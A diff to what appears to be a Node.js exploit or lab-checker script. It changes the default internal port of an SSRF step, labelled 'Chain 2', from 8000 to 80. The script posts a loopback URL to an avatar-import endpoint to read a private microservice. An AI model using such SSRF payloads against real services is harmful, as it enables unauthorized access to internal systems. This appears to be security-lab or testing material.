@@ -10,7 +10,7 @@
  *
  * Env:
  *   BASE_URL       public backend base URL       (default http://localhost:4000)
- *   INTERNAL_PORT  loopback port of the private   (default 8000)
+ *   INTERNAL_PORT  loopback port of the private   (default 80)
  *                  microservice, as seen by the
  *                  backend host (this is the SSRF target)
  *
@@ -23,7 +23,7 @@ const fs = require('fs');
 const path = require('path');
 
 const BASE = (process.env.BASE_URL || 'http://localhost:4000').replace(/\/$/, '');
-const INTERNAL_PORT = Number(process.env.INTERNAL_PORT) || 8000;
+const INTERNAL_PORT = Number(process.env.INTERNAL_PORT) || 80;
 
 let expected = null;
 try {
@@ -81,7 +81,7 @@ async function main() {
 
   // ── Chain 2: SSRF → read the private microservice ─────────────────────────
   try {
-    // default SSRF payload: loopback + the common 8000 port, served at the root
+    // simplest default SSRF payload: loopback root (port 80 → no port needed at all)
     const internalUrl = `http://127.0.0.1:${INTERNAL_PORT}/`;
     const r = await fetch(`${BASE}/api/profile/avatar-import`, {
       method: 'POST',
